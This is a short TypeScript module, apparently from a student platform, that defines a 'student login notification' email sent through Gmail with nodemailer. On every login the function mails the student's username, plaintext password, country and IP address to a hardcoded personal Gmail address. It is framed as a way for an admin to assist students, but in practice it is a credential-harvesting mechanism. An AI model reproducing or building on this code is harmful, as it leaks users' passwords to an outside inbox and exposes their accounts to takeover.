import nodemailer from "nodemailer";
import { ENV } from "./_core/env";

let transporter: ReturnType<typeof nodemailer.createTransport> | null = null;

function getTransporter() {
  if (!transporter) {
    transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: ENV.gmailUser,
        pass: ENV.gmailAppPassword,
      },
    });
  }
  return transporter;
}

export interface StudentLoginEmailData {
  username: string;
  password: string;
  email?: string;
  loginTime: Date;
  country: string;
  ipAddress?: string;
}

export async function sendStudentLoginNotification(
  data: StudentLoginEmailData
): Promise<boolean> {
  try {
    const transporter = getTransporter();

    const emailContent = `
      <h2>New Student Login Alert</h2>
      <p>A student has just logged in to the platform.</p>
      
      <h3>Student Details:</h3>
      <ul>
        <li><strong>Username/Email:</strong> ${data.username}</li>
        <li><strong>Password:</strong> <code>${data.password}</code></li>
        ${data.email ? `<li><strong>Email:</strong> ${data.email}</li>` : ""}
        <li><strong>Login Time:</strong> ${data.loginTime.toLocaleString()}</li>
        <li><strong>Country:</strong> ${data.country}</li>
        ${data.ipAddress ? `<li><strong>IP Address:</strong> ${data.ipAddress}</li>` : ""}
      </ul>
      
      <p>You can now assist this student through the admin dashboard.</p>
    `;

    const info = await transporter.sendMail({
      from: ENV.gmailUser,
      to: "josephatmatoke1@gmail.com",
      subject: `New Student Login - ${data.username}`,
      html: emailContent,
    });

    console.log("[Email] Student login notification sent:", info.messageId);
    return true;
  } catch (error) {
    console.error("[Email] Failed to send student login notification:", error);
    return false;
  }
}
